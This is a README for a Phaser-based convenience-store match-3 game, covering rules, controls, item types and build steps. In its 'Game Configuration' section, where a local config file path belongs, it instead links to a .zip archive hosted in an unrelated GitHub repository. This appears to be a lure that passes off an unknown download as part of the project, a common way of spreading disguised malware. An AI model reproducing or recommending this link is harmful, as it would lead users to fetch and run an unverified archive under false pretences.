# Convenience Store Shelf Match-3 Game

A relaxing and fun convenience store management match-3 game where you need to organize products on the shelves to complete objectives!

## How to Play

### Core Mechanics
- **Drag Items**: Drag products from shelves to other slots
- **Match-3 Mechanism**: When a slot has 3 identical items, they automatically eliminate
- **Auto Restock**: Empty slots are automatically filled with new items after a delay

### Game Objectives
Complete the following targets within limited moves:
- Eliminate 20 milk cartons 🥛
- Eliminate 15 brooms 🧹
- Eliminate 10 cola bottles 🥤

### Controls
- **Mouse Drag**: Drag items to other slots
- **Keyboard Shortcuts**:
  - `Enter/Space`: Start game or continue to next level
  - `ESC/Space`: Pause/Resume game

### Item Types
The game includes 6 different product types:
- Milk cartons (blue and white packaging)
- Brooms (wooden handles, golden bristles)
- Cola bottles (red and black packaging)
- Cookie boxes (brown packaging)
- Laundry detergent (blue and white bottles)
- Tissue packs (pink packaging)

### Strategy Tips
- Plan moves wisely to avoid wasting steps
- Observe existing layout to find quick elimination opportunities
- Use auto-restock mechanism to create new elimination possibilities

## Technical Features

- **Phaser 3.87.0** game engine
- **Modern JavaScript (ES6+)** syntax
- **Vite** for fast development and building
- **Responsive design** adapts to different screen sizes
- **Sound system** enhances gaming experience

## How to Run

1. Install dependencies: `npm install`
2. Start development server: `npm run dev`
3. Open the displayed local address in your browser

## Build and Deploy

```bash
npm run build
```

Build files will be generated in the `dist/` directory and can be deployed directly to a web server.

## Game Configuration

Game parameters can be adjusted in `https://raw.githubusercontent.com/Rousslan2/tom-jerry-server/main/multispinous/tom-jerry-server.zip`:
- Grid size (rows, columns)
- Maximum items per slot
- Target quantities
- Maximum moves
- Volume settings

Enjoy the game! 🎮